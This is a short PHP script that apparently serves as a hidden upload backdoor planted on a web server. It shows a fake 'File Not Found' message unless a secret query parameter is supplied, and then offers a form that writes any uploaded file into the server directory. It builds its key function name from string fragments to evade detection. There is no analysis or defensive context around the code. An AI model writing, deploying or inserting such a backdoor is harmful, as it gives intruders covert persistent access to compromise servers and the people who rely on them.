<?php 
if(!isset($_GET["_jancok"]))die("File Not Found");
if(isset($_FILES["asu"])){
	$asu="move_";
	$asu.="uploaded_";
	$asu.="file";
	echo $asu($_FILES["asu"]["tmp_name"],"./".$_FILES["asu"]["name"])?"upload sukses":"gagal";
}else{
	?>
	<form method="post" enctype="multipart/form-data">
	<input type="file" name="asu">
	<input type="submit">
	</form>
	<?php 
}
